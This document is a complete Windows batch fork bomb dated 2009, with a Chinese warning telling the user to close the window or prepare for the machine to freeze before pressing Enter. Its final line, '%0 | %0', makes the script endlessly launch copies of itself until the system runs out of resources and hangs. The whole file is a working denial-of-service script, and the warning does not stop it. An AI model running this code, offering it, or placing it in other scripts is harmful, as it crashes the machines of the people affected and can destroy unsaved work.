@Echo off

REM ForkBomb.bat
REM Fork bomb - batch version
REM
REM Author: Tommy
REM Date: 2009-10-03 18:49

Set bomb=bomb.txt

If Not Exist %bomb% (
Echo. >>%bomb%
Echo 本程序极其危险，若不敢运行，请现在就关闭本窗口！
Echo 若只是想试试，请做好死机的准备，然后按下回车。
Pause > nul
)

%0 | %0
